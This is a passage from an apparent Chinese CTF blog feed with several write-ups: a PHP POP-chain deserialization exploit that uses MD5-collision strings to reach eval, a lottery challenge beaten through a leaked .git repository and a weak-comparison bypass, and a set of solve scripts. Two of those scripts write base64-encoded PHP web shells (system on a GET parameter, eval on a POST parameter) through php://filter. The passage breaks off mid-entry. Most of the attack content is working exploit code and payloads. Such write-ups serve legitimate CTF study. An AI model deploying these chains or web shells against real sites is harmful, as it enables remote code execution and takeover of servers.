class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;x) &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;y) &amp;&amp; (<span class="hljs-variable language_">$this</span>-&gt;x != <span class="hljs-variable language_">$this</span>-&gt;y) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;x) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;y)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;x, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No Way!&quot;</span>);<br>           &#125;<br>           <br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Keep it up......&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Entrance</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&quot;Bunny&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome, &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;z = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;z;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;poc&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;poc&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>链子比较简单，没有什么太多弯弯绕绕的东西</p><p>漏洞点在<img src="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/image-20221218232334661.png" alt="image-20221218232334661"></p><p>反推一下，怎么去触发__invoke魔术方法 &#x3D;&gt; 当以函数方式调用对象时被调用</p><p>return $function()可以调用</p><p>将$this-&gt;z丢给Backdoor</p><p><img src="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/image-20221218232540940.png" alt="image-20221218232540940"></p><p>接着推__get魔术方法 &#x3D;&gt; 读取不可访问或不存在属性时被调用</p><p>将$this-&gt;str丢给Test</p><p><img src="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/image-20221218232720211.png" alt="image-20221218232720211"></p><p>接着反推__toString魔术方法 &#x3D;&gt; 当一个类被转换成字符串时被调用</p><p>将$this-&gt;name丢给Entrance</p><p><img src="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/image-20221218232826494.png" alt="image-20221218232826494"></p><p>完整的链子：__invoke &#x3D;&gt; __get &#x3D;&gt; __toString &#x3D;&gt; __wakeup</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Entrance</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y</span>;<br>&#125;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Entrance</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<br><br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;z=<span class="hljs-variable">$c</span>;<br></code></pre></td></tr></table></figure><p>链子是构造完成了，但是__invoke魔术方法里面的if判断，我们还需要绕过，里面固定死了$this-&gt;x和$this-&gt;y必须是字符串类型，并且后面还有md5强类型比较。</p><p>那么接下来，我们就需要牵扯到一个工具了《fastcoll_v1.0.0.5.exe》</p><p>首先创建一个1.txt文件，文件内容为</p><p>内容里有?&gt;的原因，是因为我们在构造相同数据时，后面有很多乱七八糟的字符，加个?&gt;，可以让php到这里就读取完毕，不需要再去读后面的乱字符</p><p><img src="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/image-20221218233445829.png" alt="image-20221218233445829"></p><p>创建完以后，将1.txt拖进fastcoll.exe里，就会自动在自己本地生成两个文件</p><p>1_msg1.txt</p><p>1_msg2.txt</p><p>内容分别是</p><p><img src="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/image-20221218233827838.png" alt="image-20221218233827838"></p><p><img src="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/image-20221218233845023.png" alt="image-20221218233845023"></p><p>接下来我们再去完善一下，exp</p><p>最终exp为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Entrance</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y</span>;<br>&#125;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Entrance</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<br><br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;z=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;x=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;1_msg1.txt&quot;</span>);<br><span class="hljs-variable">$c</span>-&gt;y=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;1_msg2.txt&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">O%3A8%3A%22Entrance%22%3A2%3A%7Bs%3A4%3A%22name%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22z%22%3BO%3A8%3A%22Backdoor%22%3A2%3A%7Bs%3A1%3A%22x%22%3Bs%3A192%3A%22echo+123456%3B%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%09m%C9W%0E%EAJ%97Y%D5%1D%104%97%F4%D0%1B%27p%A7%BB%F43%22W%9E%82ig%AA%23p4%B4%BE%C7x%82IL%EB%01%C7%D3%10P%C5m%0C%FE3%04%85%C1%A4%BC%83%92%8A%97%BA%5B%3A%A4%CC%A9%C5%B9%CD%84%83f%E5%97%D7a%F8%F4%EB%9B%C1%87%14%88P%9E%A2%E8%0B%C5%10%7F%A7_H%C6%CFs%06%F4%AF%06%8E6x%08L4e%27%FA%A3%23%5Er%DD%DF%15%00ynan%B2%C6%C3%CB%D2%22%3Bs%3A1%3A%22y%22%3Bs%3A192%3A%22echo+123456%3B%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%09m%C9W%0E%EAJ%97Y%D5%1D%104%97%F4%D0%1B%27p%27%BB%F43%22W%9E%82ig%AA%23p4%B4%BE%C7x%82IL%EB%01%C7%D3%10%D0%C5m%0C%FE3%04%85%C1%A4%BC%83%92%8A%17%BA%5B%3A%A4%CC%A9%C5%B9%CD%84%83f%E5%97%D7a%F8%F4%EB%9B%C1%87%14%08P%9E%A2%E8%0B%C5%10%7F%A7_H%C6%CFs%06%F4%AF%06%8E6x%08L4e%A7%F9%A3%23%5Er%DD%DF%15%00ynan2%C6%C3%CB%D2%22%3B%7D%7D%7D<br></code></pre></td></tr></table></figure><p>复现：</p><p><img src="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/image-20221218234150451.png" alt="image-20221218234150451"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lottery</title>
    <link href="/2022/12/11/lottery/"/>
    <url>/2022/12/11/lottery/</url>
    
    <content type="html"><![CDATA[<h2 id="代码审计篇："><a href="#代码审计篇：" class="headerlink" title="代码审计篇："></a>代码审计篇：</h2><p>题目首页是</p><p><img src="/2022/12/11/lottery/image-20221211142926022.png" alt="image-20221211142926022"></p><p>点击右上角的Register，可以注册一个用户</p><p><img src="/2022/12/11/lottery/image-20221211143008502.png" alt="image-20221211143008502"></p><p>用户初始钱为20，需要去玩彩票才能增长，然后达到一定数量的额度，就可以购买flag</p><p><img src="/2022/12/11/lottery/image-20221211143131221.png" alt="image-20221211143131221"></p><p>扫描目录能够看到&#x2F;.git，使用githack工具把源码dump下来</p><p>接下来，代码审计的目的那就是如何去让用户的钱得到增加</p><p>关键文件是api.php里有一个buy函数</p><p><img src="/2022/12/11/lottery/image-20221211143404388.png" alt="image-20221211143404388"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>&gt; 请求要为post<br><span class="hljs-number">2</span>&gt; content-type不能为空<br><span class="hljs-number">3</span>&gt; content-type的类型要是application/json<br></code></pre></td></tr></table></figure><p><img src="/2022/12/11/lottery/image-20221211143519758.png" alt="image-20221211143519758"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">以file_get_contents接收json数据，并赋值给<span class="hljs-variable">$data</span>变量<br></code></pre></td></tr></table></figure><p><img src="/2022/12/11/lottery/image-20221211143613373.png" alt="image-20221211143613373"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">定义了json数据里的参数<br></code></pre></td></tr></table></figure><p><img src="/2022/12/11/lottery/image-20221211143955332.png" alt="image-20221211143955332"></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">action</span>参数的值如果为buy就会进入buy函数<br></code></pre></td></tr></table></figure><p><img src="/2022/12/11/lottery/image-20221211144052138.png" alt="image-20221211144052138"></p><p><img src="/2022/12/11/lottery/image-20221211144118288.png" alt="image-20221211144118288"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">这里可以看见钱有增加<br></code></pre></td></tr></table></figure><p>那么回到上面的一个判断</p><p><img src="/2022/12/11/lottery/image-20221211144202395.png" alt="image-20221211144202395"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">req等于data，也就是这里又添加了一个新的json参数numbers，并且下面还进行了判断，是弱类型判断，既然我们可以自定义参数的值，那么win_numbers里的值我们都不需要去关心，把numbers参数的全部设置成<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>抓包改一下数据</p><p><img src="/2022/12/11/lottery/image-20221211144733280.png" alt="image-20221211144733280"></p><p>发包</p><p><img src="/2022/12/11/lottery/image-20221211144743038.png" alt="image-20221211144743038"></p><p>多发几次，钱就蹭蹭涨了</p><p>然后再去购买flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天权信安</title>
    <link href="/2022/12/09/%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89/"/>
    <url>/2022/12/09/%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89/</url>
    
    <content type="html"><![CDATA[<h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catf1ag1</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hzy</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arr</span>; <br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catf1ag2</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>&#125; <br>    <span class="hljs-variable">$cat1</span> = <span class="hljs-keyword">new</span> catf1ag1;<br>    <span class="hljs-variable">$cat2</span> = <span class="hljs-keyword">new</span> catf1ag2;<br>    <span class="hljs-variable">$cat1</span>-&gt;hzy = <span class="hljs-variable">$cat2</span>;<br>    <span class="hljs-variable">$cat1</span>-&gt;arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;1&quot;</span>=&gt;<span class="hljs-string">&quot;pputut&quot;</span>);<br>    <span class="hljs-variable">$cat2</span>-&gt;file=<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=2.php&quot;</span>;<br>    <span class="hljs-variable">$cat2</span>-&gt;txt = <span class="hljs-string">&quot;PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cat1</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>easyrsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><br>d= <span class="hljs-number">12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093</span><br>c= <span class="hljs-number">11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578</span><br>n= <span class="hljs-number">13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109</span><br>e = <span class="hljs-number">65537</span><br>p = <span class="hljs-number">0</span><br>q = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">15</span>), <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>)):<br>    <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % i == <span class="hljs-number">0</span>:<br>        p = sympy.prevprime(gmpy2.iroot((e * d - <span class="hljs-number">1</span>) // i, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br>        q = sympy.nextprime(p)<br>        <span class="hljs-keyword">if</span> (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>) == (e * d - <span class="hljs-number">1</span>) // i:<br>            <span class="hljs-keyword">break</span><br><br>m = gmpy2.powmod(c, d, n)<br>m1 = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(m1)<br></code></pre></td></tr></table></figure><h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">key1 = <span class="hljs-string">&quot;welcome_to_nine-ak_match_is_so_easy_!@!&quot;</span><br>key2 = <span class="hljs-string">&quot;20 4 24 5 94 12 2 36 26 6 49 11 68 15 14 114 12 10 43 14 9 43 10 27 31 31 22 45 10 48 58 4 18 10 38 31 14 97 92&quot;</span><br>key2arr = key2.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key2arr)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key1[i])^<span class="hljs-built_in">int</span>(key2arr[i])),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hello</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>&#125;<br><span class="hljs-variable">$a1</span> = <span class="hljs-keyword">new</span> A;<br><span class="hljs-variable">$b1</span> = <span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$a1</span>-&gt;hello = <span class="hljs-variable">$b1</span>;<br><span class="hljs-variable">$b1</span>-&gt;file = <span class="hljs-string">&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;</span>;<br><span class="hljs-variable">$b1</span>-&gt;text = <span class="hljs-string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="hisory"><a href="#hisory" class="headerlink" title="hisory"></a>hisory</h2><p><a href="https://blog.csdn.net/mmdlm/article/details/125866863">https://blog.csdn.net/mmdlm/article/details/125866863</a></p><h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>key =<span class="hljs-string">&quot;69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95&quot;</span><br><span class="hljs-comment"># text = &quot;202201040102&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>,<span class="hljs-number">2100</span>): <span class="hljs-comment">#2000-2100</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">13</span>):  <span class="hljs-comment">#12月</span><br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>): <span class="hljs-comment">#30日</span><br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">24</span>):<br>                <span class="hljs-keyword">for</span> n1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">59</span>):<br>                    result = <span class="hljs-built_in">str</span>(i)+<span class="hljs-built_in">str</span>(a).zfill(<span class="hljs-number">2</span>)+<span class="hljs-built_in">str</span>(c).zfill(<span class="hljs-number">2</span>)+<span class="hljs-built_in">str</span>(n).zfill(<span class="hljs-number">2</span>)+<span class="hljs-built_in">str</span>(n1).zfill(<span class="hljs-number">2</span>)<br>                    dd = hashlib.sha256(result.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>                    <span class="hljs-keyword">if</span>(dd==key):<br>                        <span class="hljs-built_in">print</span>(result)<br>                        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>popchains</title>
    <link href="/2022/12/08/popchains/"/>
    <url>/2022/12/08/popchains/</url>
    
    <content type="html"><![CDATA[<h2 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 